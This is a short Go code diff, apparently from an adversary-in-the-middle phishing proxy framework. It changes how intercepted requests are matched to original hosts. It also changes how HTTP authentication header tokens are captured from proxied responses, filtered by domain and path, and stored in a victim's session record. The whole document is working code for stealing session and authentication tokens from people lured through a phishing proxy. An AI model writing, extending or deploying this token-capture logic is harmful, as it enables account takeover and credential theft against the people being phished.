@@ -852,7 +852,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check if request should be intercepted
 				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+					if r_host, ok := p.replaceHostWithOriginal(o_host); ok {
 						for _, ic := range pl.intercept {
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
 							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
@@ -1023,9 +1023,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// capture http header tokens
 					for k, v := range pl.httpAuthTokens {
 						if _, ok := s.HttpTokens[k]; !ok {
-							hv := resp.Request.Header.Get(v.header)
-							if hv != "" {
-								s.HttpTokens[k] = hv
+							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
+								hv := resp.Header.Get(v.header)
+								if hv != "" {
+									s.HttpTokens[k] = hv
+								}
 							}
 						}
 					}
